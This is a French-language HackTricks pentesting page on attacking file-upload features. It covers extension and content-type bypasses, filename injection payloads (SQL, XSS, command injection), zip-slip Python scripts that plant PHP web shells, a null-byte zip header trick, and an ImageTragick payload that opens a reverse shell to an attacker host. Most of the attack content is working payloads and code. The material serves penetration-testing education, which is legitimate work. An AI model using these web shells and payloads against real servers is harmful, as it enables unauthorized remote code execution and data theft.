<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [d√©p√¥t hacktricks](https://github.com/carlospolop/hacktricks) et au [d√©p√¥t hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


# M√©thodologie g√©n√©rale de t√©l√©chargement de fichiers

1. Essayez de t√©l√©charger un fichier avec une **double extension** \(ex: _file.png.php_ ou _file.png.php5_\).
* Extensions PHP: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, ._phps_, ._pht_, _.phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc_
* Extensions ASP: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .asp, .cer, .shtml_
2. Essayez de mettre en majuscule une ou plusieurs lettres de l'extension. Par exemple: _.pHp, .pHP5, .PhAr ..._
3. Essayez de t√©l√©charger une **double (ou plus) extension** \(utile pour contourner les v√©rifications mal configur√©es qui testent si une extension sp√©cifique est simplement pr√©sente\):
1. _file.png.php_
2. _file.png.txt.php_
4. Essayez de t√©l√©charger une **double extension invers√©e** \(utile pour exploiter les erreurs de configuration d'Apache o√π tout ce qui a une extension _.php_, mais **n'ayant pas n√©cessairement une extension .php** ex√©cutera du code\):
* _ex: file.php.png_
5. Double extension avec un **caract√®re nul**:
1. _ex: file.php%00.png_
6. **Ajoutez quelques caract√®res sp√©ciaux √† la fin** de l'extension_: %00, %20, \(plusieurs points\)...._
1. _file.php%00_
2. _file.php%20_
3. _file.php...... --&gt; Sous Windows, lorsque qu'un fichier est cr√©√© avec des points √† la fin, ils seront supprim√©s \(vous pouvez donc contourner les filtres qui v√©rifient l'extension .php\)_
4. _file.php/_
5. _file.php.\_
7. Contournez les v√©rifications du type de contenu en d√©finissant la **valeur** de l'en-t√™te **Content-Type** sur: _image/png_, _text/plain, application/octet-stream_
8. Contournez la v√©rification du num√©ro magique en ajoutant au d√©but du fichier les **octets d'une vraie image** \(pour tromper la commande _file_\). Ou introduisez le shell dans les **m√©tadonn√©es**: `exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`
1. Il est √©galement possible que les **octets magiques** soient simplement **v√©rifi√©s** dans le fichier et que vous puissiez les **placer n'importe o√π dans le fichier**.
9. Utilisation du **flux de donn√©es alternatif NTFS (ADS)** dans **Windows**. Dans ce cas, un caract√®re deux-points ":" sera ins√©r√© apr√®s une extension interdite et avant une extension autoris√©e. En cons√©quence, un **fichier vide avec l'extension interdite** sera cr√©√© sur le serveur \(par exemple, "file.asax:.jpg"\). Ce fichier peut √™tre modifi√© ult√©rieurement en utilisant d'autres techniques telles que l'utilisation de son nom court. Le motif "**::$data**" peut √©galement √™tre utilis√© pour cr√©er des fichiers non vides. Par cons√©quent, l'ajout d'un caract√®re point apr√®s ce motif peut √©galement √™tre utile pour contourner d'autres restrictions \(par exemple, "file.asp::$data."\)
10. **T√©l√©chargez** la porte d√©rob√©e avec une **extension autoris√©e** \(_png_\) et priez pour une **mauvaise configuration** qui ex√©cute la porte d√©rob√©e
11. Trouvez une vuln√©rabilit√© pour **renommer** le fichier d√©j√† t√©l√©charg√© \(pour changer l'extension\).
12. Trouvez une vuln√©rabilit√© d'**inclusion de fichier local** pour ex√©cuter la porte d√©rob√©e.
13. **Divulgation possible d'informations**:
1. T√©l√©chargez **plusieurs fois** \(et en **m√™me temps**\) le **m√™me fichier** avec le **m√™me nom**
2. T√©l√©chargez un fichier avec le **nom** d'un **fichier** ou d'un **dossier** qui **existe d√©j√†**
3. T√©l√©chargez un fichier avec **‚Äú.‚Äù, ‚Äú..‚Äù, ou ‚Äú‚Ä¶‚Äù comme nom**. Par exemple, dans Apache sous **Windows**, si l'application enregistre les fichiers t√©l√©charg√©s dans le r√©pertoire "/www/uploads/", le nom de fichier "." cr√©era un fichier appel√© "uploads" dans le r√©pertoire "/www/".
4. T√©l√©chargez un fichier qui ne peut pas √™tre facilement supprim√©, tel que **‚Äú‚Ä¶:.jpg‚Äù** dans **NTFS**. \(Windows\)
5. T√©l√©chargez un fichier dans **Windows** avec des caract√®res invalides tels que `|<>*?‚Äù` dans son nom. \(Windows\)
6. T√©l√©chargez un fichier dans **Windows** en utilisant des **noms r√©serv√©s** \(**interdits**\) tels que CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 et LPT9.

Essayez √©galement de **t√©l√©charger un ex√©cutable** \(.exe\) ou un **.html** \(moins suspect\) qui **ex√©cutera du code** lorsqu'il sera ouvert accidentellement par la victime.

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files" %}

Si vous essayez de t√©l√©charger des fichiers sur un serveur **PHP**, [jetez un coup d'≈ìil √† l'astuce du fichier **.htaccess** pour ex√©cuter du code](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess).
Si vous essayez de t√©l√©charger des fichiers sur un serveur **ASP**, [jetez un coup d'≈ìil √† l'astuce du fichier **.config** pour ex√©cuter du code](../pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).
Les fichiers `.phar` sont comme les fichiers `.jar` pour Java, mais pour PHP, et peuvent √™tre **utilis√©s comme un fichier PHP** (en l'ex√©cutant avec PHP ou en l'incluant dans un script...).

L'extension `.inc` est parfois utilis√©e pour les fichiers PHP qui sont uniquement utilis√©s pour **importer des fichiers**, donc, √† un moment donn√©, quelqu'un aurait pu autoriser **cette extension √† √™tre ex√©cut√©e**.

**V√©rifiez de nombreuses vuln√©rabilit√©s possibles de t√©l√©chargement de fichiers avec le plugin BurpSuit** [**https://github.com/modzero/mod0BurpUploadScanner**](https://github.com/modzero/mod0BurpUploadScanner) **ou utilisez une application console qui trouve quels fichiers peuvent √™tre t√©l√©charg√©s et essaie diff√©rentes astuces pour ex√©cuter du code :** [**https://github.com/almandin/fuxploider**](https://github.com/almandin/fuxploider)

## **Astuce de t√©l√©chargement de fichier/SSRF avec wget**

Dans certaines occasions, vous pouvez constater qu'un serveur utilise **`wget`** pour **t√©l√©charger des fichiers** et vous pouvez **indiquer** l'**URL**. Dans ces cas, le code peut v√©rifier que l'extension des fichiers t√©l√©charg√©s se trouve dans une liste blanche pour s'assurer que seuls les fichiers autoris√©s seront t√©l√©charg√©s. Cependant, **cette v√©rification peut √™tre contourn√©e**.
La **longueur maximale** d'un **nom de fichier** sous **Linux** est de **255**, cependant, **wget** tronque les noms de fichiers √† **236** caract√®res. Vous pouvez **t√©l√©charger un fichier appel√© "A"\*232+".php"+".gif"**, ce nom de fichier **contournera** la **v√©rification** (comme dans cet exemple **".gif"** est une extension **valide**), mais `wget` renommera le fichier en **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‚ÄòAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php‚Äô

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‚ÄòAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php‚Äô saved [10/10]
```
Notez que **une autre option** √† laquelle vous pourriez penser pour contourner cette v√©rification est de faire en sorte que le serveur HTTP redirige vers un fichier diff√©rent, de sorte que l'URL initiale contourne la v√©rification, puis wget t√©l√©chargera le fichier redirig√© avec le nouveau nom. Cela **ne fonctionnera pas** **√† moins que** wget ne soit utilis√© avec le **param√®tre** `--trust-server-names` car **wget t√©l√©chargera la page redirig√©e avec le nom du fichier indiqu√© dans l'URL d'origine**.

# De l'envoi de fichiers √† d'autres vuln√©rabilit√©s

* D√©finissez le **nom de fichier** sur `../../../tmp/lol.png` et essayez d'obtenir une **travers√©e de chemin**
* D√©finissez le **nom de fichier** sur `sleep(10)-- -.jpg` et vous pourriez r√©ussir une **injection SQL**
* D√©finissez le **nom de fichier** sur `<svg onload=alert(document.comain)>` pour obtenir une XSS
* D√©finissez le **nom de fichier** sur `; sleep 10;` pour tester une injection de commande \(plus de [trucs d'injection de commande ici](command-injection.md)\)
* [**XSS** dans l'envoi de fichiers d'image \(svg\)](xss-cross-site-scripting/#xss-uploading-files-svg)
* **Envoi** de fichiers **JS** + **XSS** = [exploitation des **Service Workers**](xss-cross-site-scripting/#xss-abusing-service-workers)
* [**XXE dans l'envoi de fichiers svg**](xxe-xee-xml-external-entity.md#svg-file-upload)
* [**Redirection ouverte** via l'envoi de fichiers svg](open-redirect.md#open-redirect-uploading-svg-files)
* [C√©l√®bre vuln√©rabilit√© **ImageTrick**](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* Si vous pouvez **indiquer au serveur Web de r√©cup√©rer une image √† partir d'une URL**, vous pouvez essayer d'exploiter une [SSRF](ssrf-server-side-request-forgery.md). Si cette **image** doit √™tre **enregistr√©e** sur un site **public**, vous pouvez √©galement indiquer une URL provenant de [https://iplogger.org/invisible/](https://iplogger.org/invisible/) et **voler des informations sur chaque visiteur**.

Voici une liste des 10 principales choses que vous pouvez r√©aliser en t√©l√©chargeant \(√† partir de [ce lien](https://twitter.com/SalahHasoneh1/status/1281274120395685889)\) :

1. **ASP / ASPX / PHP5 / PHP / PHP3** : Webshell / RCE
2. **SVG** : XSS stock√©e / SSRF / XXE
3. **GIF** : XSS stock√©e / SSRF
4. **CSV** : Injection CSV
5. **XML** : XXE
6. **AVI** : LFI / SSRF
7. **HTML / JS** : Injection HTML / XSS / Redirection ouverte
8. **PNG / JPEG** : Attaque par inondation de pixels \(DoS\)
9. **ZIP** : RCE via LFI / DoS
10. **PDF / PPTX** : SSRF / XXE aveugle

# Envoi automatique de fichiers ZIP d√©compress√©s

Si vous pouvez t√©l√©charger un fichier ZIP qui va √™tre d√©compress√© sur le serveur, vous pouvez faire 2 choses :

## Lien symbolique

T√©l√©chargez un lien contenant des liens symboliques vers d'autres fichiers, puis, en acc√©dant aux fichiers d√©compress√©s, vous acc√©derez aux fichiers li√©s :
```text
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
```
## D√©compression dans diff√©rents dossiers

Les fichiers d√©compress√©s seront cr√©√©s dans des dossiers inattendus.

On pourrait facilement supposer que cette configuration prot√®ge contre l'ex√©cution de commandes au niveau du syst√®me d'exploitation via des t√©l√©chargements de fichiers malveillants, mais malheureusement ce n'est pas vrai. √âtant donn√© que le format d'archive ZIP prend en charge la compression hi√©rarchique et que nous pouvons √©galement faire r√©f√©rence √† des r√©pertoires de niveaux sup√©rieurs, nous pouvons √©chapper au r√©pertoire de t√©l√©chargement s√©curis√© en exploitant la fonction de d√©compression de l'application cible.

Une exploitation automatis√©e pour cr√©er ce type de fichiers peut √™tre trouv√©e ici : [https://github.com/ptoomey3/evilarc](https://github.com/ptoomey3/evilarc)
```python
python evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
```python
import zipfile

def create_malicious_zip(file_path, payload):
    with zipfile.ZipFile(file_path, 'w') as zip_file:
        zip_file.writestr("../payload.php", payload)

file_path = "malicious.zip"
payload = "<?php system($_GET['cmd']); ?>"
create_malicious_zip(file_path, payload)
```

This Python code creates a malicious zip file by using the `zipfile` module. The `create_malicious_zip` function takes two parameters: `file_path` (the path where the malicious zip file will be created) and `payload` (the payload to be included in the zip file).

Inside the function, a `ZipFile` object is created with the specified `file_path` and opened in write mode (`'w'`). The `writestr` method is then used to add a file named `"../payload.php"` to the zip file, with the contents being the `payload` provided.

In this example, the payload is a PHP code that allows remote command execution (`system($_GET['cmd'])`). This code can be used for malicious purposes, such as gaining unauthorized access to a vulnerable web server.

After running the code, a file named `"malicious.zip"` will be created in the specified `file_path`, containing the malicious payload.
```python
#!/usr/bin/python
import zipfile
from cStringIO import StringIO

def create_zip():
f = StringIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
Pour r√©aliser l'ex√©cution de commandes √† distance, j'ai suivi les √©tapes suivantes :

1. Cr√©er un shell PHP :
```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```
2. Utilisez la technique du "file spraying" et cr√©ez un fichier zip compress√© :
```text
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# ls *.php
simple-backdoor.php  xxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAcmd.php           xxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAxxAcmd.php        xxAxxAxxAxxAxxAcmd.php  xxAxxAxxAxxAxxAxxAxxAxxAcmd.php
root@s2crew:/tmp# zip cmd.zip xx*.php
adding: xxAcmd.php (deflated 40%)
adding: xxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
root@s2crew:/tmp#
```
3. Utilisez un √©diteur hexad√©cimal ou vi et changez "xxA" en "../", j'ai utilis√© vi :
```text
:set modifiable
:%s/xxA/..\//g
:x!
```
Seule une √©tape reste √† accomplir : t√©l√©chargez le fichier ZIP et laissez l'application le d√©compresser ! Si cela r√©ussit et que le serveur web dispose des privil√®ges suffisants pour √©crire dans les r√©pertoires, un simple shell d'ex√©cution de commandes OS sera disponible sur le syst√®me :

[![b1](https://blog.silentsignal.eu/wp-content/uploads/2014/01/b1-300x106.png)](https://blog.silentsignal.eu/wp-content/uploads/2014/01/b1.png)

**R√©f√©rence** : [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

## D√©compression avec un nom diff√©rent

Parfois, une application bloquera le chargement d'un fichier en v√©rifiant son extension √† l'int√©rieur du fichier zip. Si cette v√©rification est superficielle, c'est-√†-dire en v√©rifiant le nom du fichier √† l'int√©rieur de l'en-t√™te du champ local, elle peut √™tre contourn√©e en faisant croire √† l'application que le fichier a une telle extension, alors qu'il en aura une autre une fois d√©compress√©.

Nous pouvons r√©utiliser le script pr√©c√©dent pour cr√©er un fichier zip.
```python
#!/usr/bin/python

import zipfile
from cStringIO import StringIO

def create_zip():
f = StringIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('shell.php .pdf', '<?php echo system($_REQUEST["cmd"]); ?>')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
Notez que le nom contient un espace √† l'int√©rieur. Maintenant, vous pouvez modifier le fichier zip g√©n√©r√© avec un √©diteur hexad√©cimal et changer ce caract√®re dans le champ nom situ√© √† l'int√©rieur de l'en-t√™te du r√©pertoire central en un octet nul `00`:
```bash
# before changing the name of the file inside the Central Directory header
00000080: 0000 0073 6865 6c6c 2e70 6870 202e 7064  ...shell.php .pd
# after changing the name of the file inside the Central Directory header
00000080: 0000 0073 6865 6c6c 2e70 6870 002e 7064  ...shell.php..pd
```
Lorsque l'application v√©rifiera le nom du fichier √† l'int√©rieur du zip, le nom utilis√© pour cette v√©rification sera le nom de l'en-t√™te de fichier local, **mais pas si le zip est chiffr√©** (voir la sp√©cification pkzip). Le nom utilis√© pour stocker le fichier sera le nom de l'en-t√™te du r√©pertoire central lorsque 7z ou unzip constateront une diff√©rence entre les deux noms. Gr√¢ce √† l'octet nul, le nom sera `shell.php`.

Lors de la d√©compression :
```bash
7z e poc.zip
ls
shell.php
```
**R√©f√©rences**:

[https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html](https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html)

[https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT](https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT)

# ImageTragic

T√©l√©chargez ce contenu avec une extension d'image pour exploiter la vuln√©rabilit√© **\(ImageMagick, 7.0.1-1\)**.
```text
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
# Int√©gration d'un shell PHP dans un fichier PGN

La raison principale de placer un shell web dans le chunk IDAT est qu'il a la capacit√© de contourner les op√©rations de redimensionnement et de r√©√©chantillonnage - PHP-GD contient deux fonctions pour cela [imagecopyresized](http://php.net/manual/en/function.imagecopyresized.php) et [imagecopyresampled](http://php.net/manual/en/function.imagecopyresampled.php).

Lisez cet article: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

# Fichiers polyglottes

Les polyglottes, dans un contexte de s√©curit√©, sont des fichiers qui sont une forme valide de plusieurs types de fichiers diff√©rents. Par exemple, un [GIFAR](https://en.wikipedia.org/wiki/Gifar) est √† la fois un fichier GIF et un fichier RAR. Il existe √©galement des fichiers qui peuvent √™tre √† la fois GIF et JS, √† la fois PPT et JS, etc.

Les fichiers polyglottes sont souvent utilis√©s pour contourner les protections bas√©es sur les types de fichiers. De nombreuses applications qui permettent aux utilisateurs de t√©l√©charger des fichiers n'autorisent que certains types de fichiers, tels que JPEG, GIF, DOC, afin d'emp√™cher les utilisateurs de t√©l√©charger des fichiers potentiellement dangereux tels que des fichiers JS, des fichiers PHP ou des fichiers Phar.

Cela permet de t√©l√©charger un fichier qui est conforme au format de plusieurs formats diff√©rents. Cela vous permet de t√©l√©charger un fichier PHAR (PHp ARchive) qui ressemble √©galement √† un JPEG, mais vous aurez probablement toujours besoin d'une extension valide et si la fonction de t√©l√©chargement ne le permet pas, cela ne vous aidera pas.

Plus d'informations sur: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)





<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au r√©f√©rentiel [hacktricks](https://github.com/carlospolop/hacktricks) et [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
